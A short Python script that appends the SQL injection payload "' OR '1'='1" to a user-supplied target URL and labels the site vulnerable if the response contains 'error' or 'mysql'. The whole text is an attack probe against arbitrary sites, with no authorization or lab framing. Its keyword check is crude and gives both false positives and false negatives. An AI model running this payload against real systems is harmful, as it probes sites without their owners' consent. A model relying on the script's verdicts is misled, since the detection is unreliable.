import urllib.request
import urllib.error

url = input("Target URL (with ?id=1): ")

payload = "' OR '1'='1"
test_url = url + payload

try:
    with urllib.request.urlopen(test_url, timeout=5) as resp:
        body = resp.read().decode('utf-8', errors='ignore')
    if "error" in body.lower() or "mysql" in body.lower():
        print("[VULNERABLE] Possible SQL Injection!")
    else:
        print("[SAFE] No SQLi detected.")
except urllib.error.URLError:
    print("Request error.")
